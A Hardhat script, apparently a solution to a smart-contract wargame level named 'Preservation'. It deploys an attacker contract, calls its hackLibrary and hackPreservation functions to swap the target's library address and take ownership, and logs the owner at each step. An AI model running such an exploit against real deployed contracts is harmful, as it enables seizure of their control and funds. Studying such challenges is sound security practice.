// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { consoleLogMessage } = require("../utils/utils");

async function main() {
  // 👉 Contract name and address
  const contractName = "Preservation";
  const contractAddress = "0x44761D22C8e0Ee2E7f88F1d3359C65CEf1a530F3";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📕 Deploy the contract that will execute the hack
  const HackContract = await ethers.getContractFactory(
    "Hack" + contractName,
    hacker
  );
  const hackContract = await HackContract.connect(hacker).deploy(
    contract.address
  );
  await hackContract.deployed();

  // 🔊 Logging contracts addresses
  console.log(`📗 ${contractName}.sol address: \n${contract.address}\n`);
  console.log(
    `📕 Hack${contractName}.sol address: \n${hackContract.address}\n`
  );

  // 🔊 Logging
  consoleLogMessage("👿 Current status...");
  consoleLogMessage(`🔊 Malicious library: ${hackContract.address}`);
  consoleLogMessage(`🔊 Library: ${await contract.timeZone1Library()}`);
  consoleLogMessage(`🔊 Owner: ${await contract.owner()}`);
  consoleLogMessage("\n\n");

  // 👿 Hacking the library
  consoleLogMessage("👿 Hacking the library...");
  tx = await hackContract.connect(hacker).hackLibrary({
    gasLimit: 1000000, // 👈 Gas limit increased to avoid running out of gas
  });
  tx = await tx.wait((confirms = 1));

  // 🔊 Hack Library - transaction hash
  consoleLogMessage(
    `🔊 Hack Library - Transaction hash:\n${tx.transactionHash}\n\n`
  );

  // 🔊 Logging
  consoleLogMessage(`🔊 Malicious library: ${hackContract.address}`);
  consoleLogMessage(`🔊 Library: ${await contract.timeZone1Library()}`);
  consoleLogMessage(`🔊 Owner: ${await contract.owner()}`);
  consoleLogMessage("\n\n");

  // 👿 Hacking the contract
  tx = await hackContract.connect(hacker).hackPreservation({
    gasLimit: 1000000, // 👈 Gas limit increased to avoid running out of gas
  });
  tx = await tx.wait((confirms = 1));

  // 🔊 Hack Contract - transaction hash
  consoleLogMessage("👿 Hacking the contract...");
  consoleLogMessage(
    `🔊 Hack Contract - Transaction hash:\n${tx.transactionHash}\n\n`
  );

  // 🔊 Logging
  consoleLogMessage(`🔊 Malicious library: ${hackContract.address}`);
  consoleLogMessage(`🔊 Library: ${await contract.timeZone1Library()}`);
  consoleLogMessage(`🔊 Owner: ${await contract.owner()}`);
  consoleLogMessage("\n\n");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
